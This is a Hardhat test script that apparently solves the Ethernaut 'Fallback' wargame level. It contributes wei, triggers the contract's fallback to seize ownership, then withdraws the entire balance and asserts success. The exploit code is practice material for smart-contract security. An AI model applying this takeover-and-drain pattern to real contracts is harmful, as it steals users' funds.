import { TransactionResponse } from "@ethersproject/providers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Fallback", function () {
  it("Pwn", async function () {
    const ABI = ["function contribute() payable", "function owner() view returns (address)", "function withdraw()"];
    const ADDRESS = "0x38028a7955599c4Ef203cF019A8477E6b82Ce246";
    const contract = await ethers.getContractAt(ABI, ADDRESS);
    const [signer] = await ethers.getSigners();

    console.log("Contributing...");
    let tx: TransactionResponse = await contract.contribute({ value: 1 });
    await tx.wait();
    console.log("Sending ether...");
    tx = await signer.sendTransaction({ to: ADDRESS, value: 1 });
    await tx.wait();
    const owner: string = await contract.owner();
    console.log(`owner(): ${owner}`);
    console.log("Withdrawing...");
    tx = await contract.withdraw();
    await tx.wait();
    const balance = await ethers.provider.getBalance(ADDRESS);
    console.log(`Contract balance: ${balance}`);
    expect(owner).to.equal(signer.address);
    expect(balance).to.equal(0);
  });
});
